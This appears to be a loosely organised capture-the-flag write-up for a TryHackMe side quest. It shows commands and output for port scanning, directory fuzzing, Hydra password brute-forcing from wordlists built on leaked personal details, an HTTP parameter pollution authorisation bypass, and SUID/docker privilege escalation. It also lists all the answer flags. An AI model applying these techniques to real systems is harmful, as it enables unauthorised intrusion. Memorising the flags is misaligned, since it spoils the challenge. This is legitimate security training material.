sidequest 1,
https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu

The Great Disappearing Act
Can you help Hopper escape his wrongful imprisonment in HopSec asylum?
 
 What is the first flag?

`***{********_***}`

What is the second flag?

`***{***_****_****_*********_******}`
 
What is the third flag?

`***{***_****_***_*******}`
  
  
  
 Do not share questions or hints, including in videos, streams, or any other medium while the event is running (until Dec 31st).
 
 
 
 01.01.2026
 

 
 
 steps:
 step 1: solve the egg decode
start egg decode

 `now_you_see_me`
### Password = now_you_see_me

Step 2:
post you go to unlock with that password in port there say, there will firewall unlock for continue:

```  
nmap -sV -T4 -vv -O -A XX.XXX.XXX.XX
...
ORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3a:8c:aa:d1:c2:7d:35:a2:4f:63:ee:18:9e:4c:db:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZIUa7BZ427vgRujJuPhmrG8ZkObZBBL6in4nEKk13N2bWmsM07+H2QpOkEVBmLQA9Y1vCyZOHWpSc2dydomVE=
|   256 8e:d3:92:e6:74:dc:9d:cf:af:fa:55:23:35:32:3c:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHnYSznfBD1ILm+utjl4DNm3DWbU8Z3sDIbql+7XUmgw
80/tcp   open  http     syn-ack ttl 62 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: HopSec Asylum - Security Console
|_http-server-header: nginx/1.24.0 (Ubuntu)
8000/tcp open  http-alt syn-ack ttl 61
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-title: Fakebook - Sign In
|_Requested resource was /accounts/login/?next=/posts/
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 179
|     Vary: Accept-Language
|     Content-Language: en
|     X-Content-Type-Options: nosniff
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <title>Not Found</title>
|     </head>
|     <body>
|     <h1>Not Found</h1><p>The requested resource was not found on this server.</p>
|     </body>
|     </html>
|   GenericLines, Help, RTSPRequest, SIPOptions, Socks5, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /posts/
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Vary: Accept-Language
|     Content-Language: en
|_    X-Content-Type-Options: nosniff
8080/tcp open  http     syn-ack ttl 62 SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-title: HopSec Asylum - Security Console
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
```
  
There are 4 open port

22 (ssh)
80 (HTTP)
8080 (HTTP)
8000 (HTTP)


```bash
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8000/tcp open     http-alt
8080/tcp open     http-proxy
9001/tcp filtered tor-orport
```

*Port `80` leads to a security console, port `8000` leads to` Fakebook` social media website and port `8080` redirects to the same console on port `80`*




hidden path
ffuf -u http://XX.XXX.XXX.XX/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null   
cgi-bin                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 177ms]

facebook path


ffuf -u http://XX.XXX.XXX.XX/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 217ms]
chat                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 265ms]
media                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 197ms]
posts                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 224ms]
profiles                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 224ms]
 
with info of facebook register can continue with mail and password.
 Security Console Website: 
 
 - `Hopkins, please stop forgetting your password`
 
 Fakebook Website Comments

- Guard Hopkins: `Happy 43rd anniversary to the year I was born. Yep 1982! What a year for the world. `

- Sir Carrotbane: `HAHAHA heard they locked up my old boss Hopper. GOOD! ITS WHERE HE BELONGS , The red team battalion has been WAY better since I took control. `

- Sir Carrotbane: `Did you know that if you enter your password as a comment on a post, it appears as *'s? `

- Sir Carrotbae: `Trying my hand at some bruteforcing challenges on thm, good to see they have /opt/hashcat-utils/src/combinator.bin on the AttackBox! Always comes in handy `

- Guard Hopkins: `Taking Johnnyboy on a walk! Johnnyboy is my best friend although I do have more (sorry for the brag) `

- Guard Hopkins: `@DoorDasher , My discount code didn't work on my latest order, just realised I paid full price. Can you check your support email , you should have one from: guard.hopkins@hopsecasylum.com `

Comments on Post:

- Guard Hopkis: `Pizza1234$`

- Guard Hopkis: `WHAT THE HELL CARROTBANE!!! NOW I NEED TO CHANGE MY PASSWORD!!!!!`

*The comment about `combinator.bin` heavily suggests that we have to combine wordlists to bruteforce the password. We already Hopkin's email - `guard.hopkins@hopsecasylum.com`*

*I ended up creating 2 wordlists - 1 containing various strings and another containing numbers and symbols. Ofcourse I used AI to help me create these 2 wordlists*

*Here's a small snippet of what those wordlists looked like:*

```
Pizza
pizza
PIZZA
Hopkins
hopkins
HOPKINS
Hopkis
guard.hopkins
guardhopkins
GuardHopkins
Johnnyboy
johnnyboy
Johnny...and more
```

```
1234
12345
123456
1982
43
82
22
2025
1982$
1982!
1982@
1982#
1982%
43$
43!
43@...and more
```

*I combined them with the following command:*

```bash
combinator.bin l1.txt l1.txt > l12.txt
```

*I then ran `Hydra` to brute force. By the way, you have to use `8080` proxy and not `80` as it does not work:*

```
hydra -s 8080 -t 16 -V -f   -l "guard.hopkins@hopsecasylum.com" -P t12.txt 10.49.163.2   http-post-form "/cgi-bin/login.sh:username=^USER^&password=^PASS^:Invalid username or password"
```

```bash
[ATTEMPT] target 10.49.163.2 - login "guard.hopkins@hopsecasylum.com" - pass "Johnnyboy!1234" - 751 of 2091 [child 14] (0/0)
[ATTEMPT] target 10.49.163.2 - login "guard.hopkins@hopsecasylum.com" - pass "Johnnyboy@1234" - 752 of 2091 [child 5] (0/0)
[8080][http-post-form] host: 10.49.163.2   login: guard.hopkins@hopsecasylum.com   password: Johnnyboy1982!
[STATUS] attack finished for 10.49.163.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-03 18:23:09
```

*The password is: `Johnnyboy1982!`*

*I proceeded to unlock the `Cell / Storage` Wing as instructed in the task and got the first flag .
`THM{h0pp1ing_m4d}`*





 Key 1: Cells / Storage Door   → Unlocks Hopper's Cell     → FLAG 1
 Key 2: Psych Ward Exit        → Requires 4-digit PIN      → FLAG 2 (Part 1)
 Key 3: Main Corridor Exit     → SCADA Bypass Required     → FLAG 3
 EXIT:  Final Escape Door      → Submit all 3 flags        → INVITE CODE

Step 1: Unlock Hopper's Cell
Vulnerability Exploited: CGI Script Manipulation

Payload: /key_flag.sh?door=hopper
Artifact: Flag 1 obtained.  `THM{h0pp1ing_m4d}`*

Step 2: Move Through the Lobby
Enumeration: Identified a camera API active on port 13401.
Exploitation Technique: Utilized HTTP Parameter Pollution (HPP) to bypass authorization and gain access to the admin camera feed.

```bash
nmap -sC -sV -p- 10.49.163.2
```

*The most interesting port out of these was `13400` as it led to `HopSec Asylum Facility Video Portal`.*

*This took me forever to figure out so I'll summarize what I did:*

*I logged into the video portal with the guard credentials and extracted the JWT token from localStorage.

*I discovered the server wasn't validating the JWT signature, so I modified the token to change `"role":"guard"` to `"role":"admin"` and updated it in localStorage.*

*However, when I tried requesting the admin camera (cam-admin) using the modified token with

```bash
curl -X POST "http://10.48.191.182:13401/v1/streams/request" -H "Authorization: Bearer {\"sub\": \"guard.hopkins@hopsecasylum.com\", \"role\": \"admin\", \"iat\": 1765182837}.<signature>" -d '{"camera_id":"cam-admin","tier":"admin"}'
```

*the server returned a 401 unauthorized error. This meant the signature was actually being validated when the role changed.*

*I went back to using the original valid guard token and tried several exploitation techniques on the `/v1/streams/request` endpoint itself testing missing tier fields, requesting guard cameras with admin tiers etc.

*The breakthrough came when I tested HTTP Parameter Pollution by passing `tier=admin` as a URL query parameter while keeping `tier=guard` in the JSON body:*

```bash
curl -X POST "http://10.48.191.182:13401/v1/streams/request?tier=admin" -H "Authorization: Bearer {valid_guard_token}" -d '{"camera_id":"cam-admin","tier":"guard"}'
```

*This returned `"effective_tier": "admin"`  with a valid admin ticket, exploiting the server's priority of query parameters over body parameters. I then accessed the real admin camera stream using the ticket ID in the manifest URL.*

*The video showed a keypad being accessed - The code `115879`*

*But of course, it cant't be this easy (even though it wasn't). I only found the first part of the flag:*

`THM{Y0u_h4ve_b3en_`

$ cat user_part2.txt
j3stered_739138}
 

**Flag 2 (Combined):**
- Part 1 (from initial enum): `THM{Y0u_h4ve_b3en_`
- Part 2 (from console): `j3stered_739138}`

### ✅ Flag 2: `THM{Y0u_h4ve_b3en_j3stered_739138}`




Step in now:  Bypass the Psych Ward Keypad
Discovery: Found a hidden diagnostics endpoint embedded within an HLS manifest.
Data Leak: Leaked a console token via the job status monitoring.

Artifact: Flag 2 obtained, port for scada ok.



From the console shell, we discovered a SCADA terminal running on localhost:

```bash
$ ss -tlnp
LISTEN  0  128  127.0.0.1:9001  *:*  users:(("python3",pid=1234,fd=5))
```

### Step 2: SCADA Authentication

**Connecting to SCADA:**
```bash
$ nc 127.0.0.1 9001

################################################################################
#                                                                              #
#                    ██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗ ██████╗         #
#                    ██║  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔════╝         #
#                    ███████║██║   ██║██████╔╝███████╗█████╗  ██║              #
#                    ██╔══██║██║   ██║██╔═══╝ ╚════██║██╔══╝  ██║              #
#                    ██║  ██║╚██████╔╝██║     ███████║███████╗╚██████╗         #
#                    ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝ ╚═════╝         #
#                                                                              #
#                          ASYLUM SCADA CONTROL SYSTEM                         #
#                                                                              #
################################################################################

[!] Authentication Required
Enter maintenance token:
```

**Token:** Flag 2 (`THM{Y0u_h4ve_b3en_j3stered_739138}`) was the SCADA token!

```
> THM{Y0u_h4ve_b3en_j3stered_739138}
[+] Access Granted.
SCADA #LOCKED>
```

### Step 3: Finding the Unlock Code

The SCADA terminal required a **numeric unlock code**. After enumeration, we discovered:

**Code Location:** `/root/.asylum/unlock_code` inside Docker container `asylum_gate_control`

**The Problem:** We were running as `svc_vidops` with no root access.

### Step 4: Privilege Escalation via SUID Binary

**Discovery:**
```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/diag_shell
```

**Analysis:**
```bash
$ ls -la /usr/local/bin/diag_shell
-rwsr-xr-x 1 dockermgr dockermgr 16832 Dec  1 00:00 /usr/local/bin/diag_shell

$ file /usr/local/bin/diag_shell
/usr/local/bin/diag_shell: setuid ELF 64-bit LSB executable
```

The binary had **SUID** bit set and was owned by `dockermgr` (UID 1501).

**Key Insight:** The binary sets UID to `dockermgr` but NOT the GID. To access Docker, we needed to use `sg docker` to temporarily gain docker group privileges.

### Step 5: Extracting the Unlock Code

**The Command Chain:**
```bash
$ echo 'sg docker -c "docker exec -u root asylum_gate_control cat /root/.asylum/unlock_code"' | /usr/local/bin/diag_shell
739184627
```

**Breakdown:**
1. `diag_shell` - Spawns bash with UID set to dockermgr (1501)
2. `sg docker` - Executes command with docker group privileges
3. `docker exec -u root` - Runs command as root inside container
4. `cat /root/.asylum/unlock_code` - Reads the unlock code







Step 4: Reach the Main Corridor
Target: SCADA terminal accessible on localhost:9001.

Privilege Escalation: Exploited the /usr/local/bin/diag_shell binary to elevate permissions.

Access Credentials: Unlock code "obtained".

```bash
$ curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -d "code=739184627" \
    "http://127.0.0.1:8080/cgi-bin/exit_check.sh"
```

**Response:**
```json
{"ok":true,"flag":"THM{p0p_go3s_THe_W3as3l}"}
```

### ✅ Flag 3: `THM{p0p_go3s_THe_W3as3l}`




Artifact: Flag 3 obtained.




Step 5: Escape the Facility
Final Validation: Submitted all three flags to  /escape_check.sh.

```bash
$ curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -d "flag1=THM{h0pp1ing_m4d}&flag2=THM{Y0u_h4ve_b3en_j3stered_739138}&flag3=THM{p0p_go3s_THe_W3as3l}" \
    http://127.0.0.1:8080/cgi-bin/escape_check.sh
```

**Response:**
```json
{
  "ok": true,
  "invite_url": "https://static-labs.tryhackme.cloud/apps/hoppers-invitation/",
  "invite_code": "THM{There.is.no.EASTmas.without.Hopper}"
}
```




Final Rewards:

Invite Code: Invitation code obtained.

Access URL: Hopper's Invitation https://static-labs.tryhackme.cloud/apps/hoppers-invitation/

thats is all.


## 🔗 Invitation to Next Challenge

**URL:** `https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`

**Invite Code:** `THM{There.is.no.EASTmas.without.Hopper}`




## flags

| Step | Location | Objective | Flag |
|------|----------|-----------|------|
| 1 | Cells / Storage | Unlock Hopper's Cell | `THM{h0pp1ing_m4d}` |
| 2 | Psych Ward Exit | Bypass the Keypad | `THM{Y0u_h4ve_b3en_j3stered_739138}` |
| 3 | Main Corridor | SCADA Terminal Bypass | `THM{p0p_go3s_THe_W3as3l}` |
| 4 | Exit Door | Submit all flags | `THM{There.is.no.EASTmas.without.Hopper}` |





 
 TUTORIAL:
 https://0xb0b.gitbook.io/writeups/tryhackme/2025/advent-of-cyber-25-side-quest/the-great-disappearing-act
 
 video:
 https://www.youtube.com/watch?v=Hccbd7_g9mE
 
 